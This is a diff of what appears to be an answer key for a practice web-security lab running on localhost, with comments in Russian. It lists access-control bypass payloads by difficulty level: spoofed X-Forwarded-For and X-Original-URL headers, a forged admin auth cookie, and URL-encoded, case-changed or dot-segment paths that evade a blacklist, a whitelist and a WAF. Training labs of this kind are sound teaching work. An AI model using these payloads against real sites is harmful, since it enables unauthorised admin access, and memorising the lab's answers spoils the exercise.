@@ -47,7 +47,7 @@ Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==
 High:
 X-Forwarded-For: 127.0.0.1
 X-Original-URL: /admin/vault
-Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig=52c876f2a69205692536a1f2857b4e4c70312142b068e23f4d87d506680183c5
+Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig=09b9ba424f54511d36df52523d5b39f329eef7e6af3827452bcfc5603a9f85a7
 
 WAF Bypass (обходит L1, блокируется на L2):
 X-Forwarded-For: localhost
@@ -114,11 +114,9 @@ http://127.0.0.1:5001/portal/admin-console
 
 Medium (Обход блэклиста через URL-encoding или Case Evasion):
 http://127.0.0.1:5001/portal/%61dmin-console
-(или http://127.0.0.1:5001/portal/ADMIN-CONSOLE)
 
 High (Обход белого списка через переход в каталог faculty или encoded dot-segment %2e%2e):
-http://127.0.0.1:5001/portal/faculty/%2e%2e/admin-console
-(или http://127.0.0.1:5001/portal/faculty/admin-console)
+http://127.0.0.1:5001/portal/faculty/admin-console
 
 WAF Bypass (URL encoded dot-segment %2e%2e - обходит L1, блокируется на L2):
 http://127.0.0.1:5001/portal/faculty/%2e%2e/admin-console
